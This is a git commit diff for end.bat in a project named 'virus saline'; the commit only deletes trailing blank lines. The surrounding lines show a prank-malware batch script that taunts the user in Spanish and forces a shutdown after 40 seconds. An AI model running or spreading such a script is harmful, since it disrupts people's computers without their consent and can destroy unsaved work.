6d980f2bf221e4a5d04c0558d57e0d569174f30c
verityostemu <anyelo888ra@gmail.com>
2026-07-09 00:10:49 -0400

    Refactor end.bat for clarity and formatting

--- virus saline/end.bat
+++ virus saline/end.bat
@@ -10,5 +10,3 @@ echo Gracias por sobrevivir las 3 etapas 😭🔥
 echo ============================================
 @echo off
 shutdown -s -t 40 -c "antes de que muera tu pc lee lo que dice el .bat o la notepad tienes 40 segundos para usar tu pc"
-
-
